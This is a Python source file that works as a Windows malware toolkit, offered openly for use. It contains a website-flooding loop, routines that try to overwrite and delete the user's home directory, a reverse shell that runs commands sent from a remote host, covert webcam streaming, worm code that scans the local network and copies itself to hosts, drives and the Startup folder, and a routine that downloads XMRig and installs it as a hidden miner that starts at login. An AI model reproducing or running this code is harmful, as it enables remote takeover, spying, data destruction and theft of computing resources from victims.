import os
from shutil import copy2
import zipfile
import tqdm
import shutil
import win32api
import socket
import subprocess
import platform
import cv2
import mss
import time
import zlib
import numpy as np
import webbrowser
import requests
import threading

class Web:
    def DDOSWebsite(TargetWEBSITE, RequestRATE):
        while True:
            requests.get(TargetWEBSITE)
            time.sleep(RequestRATE)
          
    def OpenWebsite(TargetWEBSITE, LOOP, LoopRATE):
        if LOOP == True:
            while True:
                webbrowser.open(TargetWEBSITE)
                time.sleep(LoopRATE)
        elif LOOP == False:
            webbrowser.open(TargetWEBSITE)
            
class File:
    def BombUserDir(msg):
        try:
            with open(os.path.expanduser("~"), 'w') as file:
                file.write(msg)
        except Exception as e:
            print(f'Error: {e}')
            
    def DeleteUserDir():
        try:
            os.remove(os.path.expanduser("~"))
        except Exception as e:
            print(f"An error occurred: {e}")
     
class Payload:
    def REVERSESHELLPayload(TargetIP ,TargetPORT):
        BUFFER_SIZE = 4096
        SEPARATOR = "<sep>"
        
        s = socket.socket()
        
        s.connect((TargetIP, TargetPORT))
        
        cwd = os.getcwd()
        s.send(cwd.encode())
        
        while True:
            
            command = s.recv(BUFFER_SIZE).decode()
            splited_command = command.split()
            if command.lower() == "exit":
                
                break
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                
                output = subprocess.getoutput(command)
            
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        
        s.close()
    
    def WEBCAMPayload(TargetIP ,TargetPORT):
            SCREEN_PORT = 5001
            CONNECTED = False

            def sendWebcam():
                while time.sleep(5):
                    if CONNECTED == False:
                        try:
                            CONNECTED = True

                        except Exception:
                            CONNECTED = False
                            pass
                
                else:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                                client_socket.connect((TargetIP, TargetPORT))

                                client_ip = socket.gethostbyname(socket.gethostname())

                                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as screen_socket:
                                    screen_socket.bind((client_ip, SCREEN_PORT))

                                    screen_socket.listen()

                                    client_socket.send(screen_socket.getsockname()[0].encode())
                                    screen_conn, _ = screen_socket.accept()

                                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)

                                    try:
                                        while True:
                                            ret, frame = cap.read()
                                            if not ret:
                                                break
                                            
                                            _, img_encoded = cv2.imencode('.jpg', frame)
                                            img_bytes = img_encoded.tobytes()
                                            compressed_img = zlib.compress(img_bytes)

                                            screen_conn.send(len(compressed_img).to_bytes(4, byteorder='big'))
                                            screen_conn.send(compressed_img)
                                    finally:
                                        cap.release()
                                        
                    except Exception:
                        CONNECTED = False
                        pass                    

            send_screen_thread = threading.Thread(target=sendWebcam)
            send_screen_thread.start()
            send_screen_thread.join()      
            
class Server:
    def REVERSESHELLServer(HostIP, HostPORT):
        BUFFER_SIZE = 4096
        SEPARATOR = "<sep>"
        s = socket.socket()
        
        s.bind((HostIP, HostPORT))
        
        s.listen(5)
        print(f"Listening as {HostIP}:{HostPORT} ...")
        
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        
        cwd = client_socket.recv(BUFFER_SIZE).decode()
        print("[+] Current working directory:", cwd)
        
        while True:
            
            command = input(f"{cwd} $> ")
            if not command.strip():
                continue
            
            client_socket.send(command.encode())
            if command.lower() == "exit":
                break
            
            output = client_socket.recv(BUFFER_SIZE).decode()
            
            results, cwd = output.split(SEPARATOR)
            
            print(results)
    
    def WEBCAMServer(HostIP, HostPORT, QuitKEY):

            SCREEN_WIDTH = 1920
            SCREEN_HEIGHT = 1080
            SCREEN_PORT = 5001
            SCREEN_CAPTURE_REGION = {'top': 0, 'left': 0, 'width': SCREEN_WIDTH, 'height': SCREEN_HEIGHT}


            def screen_capture():
                with mss.mss() as sct:
                    primary_monitor_index = 0

                    screenshot = sct.grab(sct.monitors[primary_monitor_index])

                    frame = np.array(screenshot, dtype=np.uint8)

                return frame

            def handle_client(client_socket):
                client_ip = client_socket.recv(1024).decode()
            
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as screen_socket:
                    screen_socket.connect((client_ip, SCREEN_PORT))
            
                    while True:

                        size_bytes = b''
                        while len(size_bytes) < 4:
                            size_chunk = screen_socket.recv(4 - len(size_bytes))
                            if not size_chunk:
                                break  
                            size_bytes += size_chunk
            
                        if not size_bytes:
                            break
                        
                        frame_size = int.from_bytes(size_bytes, byteorder='big')
            

                        frame_data = b''
                        while len(frame_data) < frame_size:
                            data_chunk = screen_socket.recv(frame_size - len(frame_data))
                            if not data_chunk:
                                break  
                            frame_data += data_chunk
            
                        if not frame_data:
                            break
                        

                        decompressed_data = zlib.decompress(frame_data)
            

                        img_array = np.frombuffer(decompressed_data, dtype=np.uint8)
                        frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
            

                        cv2.imshow('Screen', frame)
            

                        if cv2.waitKey(1) & 0xFF == ord(QuitKEY):
                            break
                        

                cv2.destroyAllWindows()

            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((HostIP, HostPORT))
            server_socket.listen()

            print(f"Server listening on {HostIP}:{HostPORT}")

            while True:
                client_socket, addr = server_socket.accept()
                print(f"Accepted connection from {addr}")

                client_handler = threading.Thread(target=handle_client, args=(client_socket,))
                client_handler.start()

class Worm:
    def NETWORKSpreading(ServerPORT):
        host_ip = socket.gethostbyname(socket.gethostname())
        network_prefix = '.'.join(host_ip.split('.')[:-1]) + '.'
        available_ips = []
        for i in range(1, 255):
            local_ip = network_prefix + str(i)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((local_ip, ServerPORT))
            sock.close()
            if result == 0:
                available_ips.append(local_ip)
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        server_socket.bind(('0.0.0.0', ServerPORT))
        print(f"Server listening on 0.0.0.0:{ServerPORT}")
        with open(__file__, 'wb') as file:
            while True:
                data, client_address = server_socket.recvfrom(1024)
                if not data:
                    break
                file.write(data)
        server_socket.close()
        copy_file_path = __file__
        shutil.copyfile(__file__, copy_file_path)
        for ip in available_ips:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

            with open(copy_file_path, 'rb') as file:
                data = file.read(1024)
                while data:
                    client_socket.sendto(data, (ip, ServerPORT))
                    data = file.read(1024)
            client_socket.close()
            copy2(__file__, "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
            subprocess.run(['python', copy_file_path])

    def DriveSpreading(SpreadingRATE):
        if platform.system() == "Windows":
            bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
            while True:
                drives = win32api.GetLogicalDriveStrings()
                drives = drives.split('\000')[:-1]
                print(drives)
                for drive in drives:
                    try:
                        if "C:\\" == drive:
                            copy2(__file__, bootfolder)
                        else:
                            copy2(__file__, drive)
                    except:
                        pass
                    
                time.sleep(SpreadingRATE)
            else:
                print("User dont use Windows!")
                
class CryptoMiner:
    def XMRig(WalletAddress, MiningPool):
        response = requests.get("https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip", stream=True)
        with open("xmrig-6.21.0-gcc-win64.zip", 'wb') as file:
            for chunk in response.iter_content(chunk_size=128):
                file.write(chunk)
                
        with zipfile.ZipFile("./xmrig-6.21.0-gcc-win64.zip", 'r') as zip_ref:
            zip_ref.extractall("./xmrig-6.21.0-gcc-win64")
        
        file = open('startxmr.bat', 'w')
        file.write(f"""
@echo off
start /b "" "C:/ProgramData/xmr/start.cmd" > nul 2>&1
pause
                """)
        file.close()
        
        xmrfile = open('start.cmd', 'w')
        xmrfile.write(f"""
@echo off
start /b "" xmrig.exe --donate-level 1 -o {MiningPool} -u {WalletAddress} -a rx/0 -k > nul 2>&1
pause
                """)
        xmrfile.close()
        
        shutil.move("./xmrig-6.21.0-gcc-win64/xmrig-6.21.0/xmrig.exe", "./xmrig.exe")
        
        try:
            file_list = os.listdir('./xmrig-6.21.0-gcc-win64/xmrig-6.21.0')
            for file_name in file_list:
                file_path = os.path.join('./xmrig-6.21.0-gcc-win64/xmrig-6.21.0', file_name)
                if os.path.isfile(file_path):
                    os.remove(file_path)
        except Exception as e:
            print(f"An error occurred: {e}")
            
        os.rmdir('./xmrig-6.21.0-gcc-win64/xmrig-6.21.0')
        os.rmdir('./xmrig-6.21.0-gcc-win64')
        
        os.remove('./xmrig-6.21.0-gcc-win64.zip')
        
        os.mkdir("C:/ProgramData/xmr")
        
        shutil.move("./start.cmd","C:/ProgramData/xmr/start.cmd")
        shutil.move("./xmrig.exe","C:/ProgramData/xmr/xmrig.exe")
        
        shutil.move("./startxmr.bat","/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startxmr.bat")
        
        subprocess.call(["/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startxmr.bat"], shell=True)